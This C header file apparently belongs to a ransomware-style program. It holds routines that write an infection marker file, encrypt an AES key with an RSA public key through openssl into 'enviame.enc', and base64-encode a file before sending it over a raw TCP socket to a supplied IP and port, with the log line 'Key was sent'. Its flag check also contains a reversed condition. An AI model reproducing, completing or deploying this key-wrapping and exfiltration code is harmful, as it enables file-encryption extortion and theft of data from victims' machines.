#ifndef _FILE_HANDLING_H
#define _FILE_HANDLING_H

/*

This headers handles file management

*/

int create_flag(const char* filename) {
    if (access(filename, F_OK) != 0) {
        debug("Fileflag %s was found. Returning 0.", filename);
        return 0;
    }

    int fd = open(filename, O_CREAT | O_WRONLY, 0400);

    if (fd < 0) {
        dbgerr("Error on opening file descriptor");
        dbgerr("open returned %d", fd);
        exit(fd);
    }

    dprintf(fd, "1");
    close(fd);
    debug("Flagfile %s created.", filename);
    return 0;
}

int send_file(char * filename, char * ip, char * port) {
    char * outbuffer = malloc(1024 * sizeof(char));
    int mypipe[2]; // tubería 1 -> 0
    int p = pipe(mypipe);

    if (p == -1) {
        dbgerr("Error creating the pipe.\n");
        exit(3);
    }

    pid_t fc = fork();

    if (fc < 0) {
        dbgerr("Error on forking...\n");
        exit(4);
    } else if (fc == 0) { // in the child
        dup2(mypipe[1], STDOUT_FILENO);
        char * myargs[] = {"base64", filename, (char *) NULL};
        int e = execv("/usr/bin/base64", myargs);
        exit(0);
    } else {
        int status;
        int r = wait(&status);

        if (r == -1) {
            dbgerr("Something went wrong.\n");
        }

        read(mypipe[0], outbuffer, 1024);
        //printf("result: %s\n", outbuffer);

        /*
        * next code is to handle connection
        */

        int socketfd = socket(AF_INET, SOCK_STREAM, 0);
        
        if (socketfd < 0) {
            dbgerr("Error on socket.\n");
            exit(5);
        }

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(atoi(port));
        r = inet_pton(AF_INET, ip, &server_addr.sin_addr);

        if (r < 0) {
            dbgerr("Invalid address.");
            exit(5);
        }

        r = connect(socketfd, (struct sockaddr *) &server_addr, sizeof(server_addr));

        if (r < 0) {
            dbgerr("Connection failed");
            exit(5);
        }

        send(socketfd, outbuffer, strlen(outbuffer), 0);
        debug("Key was sent.\n");
        shutdown(socketfd, SHUT_RDWR);
        close(socketfd);
    }

    return 0;
}


int create_enc_file(char aes[]){
    //echo "texto ctm" | openssl rsautl -encrypt -pubin -inkey clave.pub.pem -out enviame.enc
    char * mybin = "/usr/bin/openssl";
    int mypipe[2];
    int r = pipe(mypipe);

    if (r < 0) {
        dbgerr("Error on creating pipe.\n");
        exit(6);
    }

    pid_t fc = fork();

    if (fc < 0) {
        dbgerr("Error on forking.\n");
        exit(7);
    } else if (fc == 0) {
        close(mypipe[1]);
        dup2(mypipe[0], STDIN_FILENO);
        char * args[] = {
            "openssl", "rsautl", "-encrypt", 
            "-pubin", "-inkey", "clave.pub.pem", 
            "-out", "enviame.enc", (char *)NULL
        };
        int e = execv("/usr/bin/openssl", args);
        exit(e);
    } else {
        int status;
        close(mypipe[0]);
        dprintf(mypipe[1], "%s", aes);
        close(mypipe[1]);
        int ro = wait(&status);
        debug("Child returned: %d", ro);
        /**
        if (ro < 0) {
            dbgerr("Error with openssl on creating enc file...");
            dbgerr("Error value: %d", ro);
            exit(ro);
        }
        **/
    }
    
    return 0;
}


#endif